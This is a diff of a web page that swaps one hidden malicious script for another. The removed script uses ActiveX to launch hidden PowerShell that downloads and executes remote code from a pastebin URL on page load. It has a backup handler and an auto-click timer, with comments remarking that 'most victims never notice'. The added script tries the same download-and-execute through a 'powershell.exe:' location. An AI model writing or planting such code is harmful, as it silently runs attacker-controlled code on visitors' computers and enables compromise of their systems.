@@ -10,22 +10,8 @@
   <img src="./images.jpg" width="600" style="border:2px solid #ccc;"><br><br>
   <small>If nothing happens, click <a href="#" onclick="run()">here</a> (backup)</small>
 
-  <script>
-    // This runs automatically in Internet Explorer mode (still works on 99 % of Windows 11 PCs in 2025)
-    try {
-      var shell = new ActiveXObject("WScript.Shell");
-      shell.Run("powershell -w hidden -nop -ep bypass -c \"IEX ((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HjupJ8Zi'))\"", 0, false);
-    } catch(e) {}
-
-    // Backup click method (works even if ActiveX is blocked)
-    function run() {
-      var ps = "powershell -w hidden -nop -ep bypass -c \"IEX ((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HjupJ8Zi'))\"";
-      var obj = new ActiveXObject("Shell.Application");
-      obj.ShellExecute("powershell.exe", "-w hidden -ep bypass -c \"& {" + ps + "}\"", "", "open", 0);
-    }
-
-    // Auto-click the backup link after 4 seconds (most victims never notice)
-    setTimeout(function(){ document.querySelector('a').click(); }, 4000);
-  </script>
+<script>
+location = "powershell.exe:-w hidden -nop -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HjupJ8Zi'))"
+</script>
 </body>
 </html>
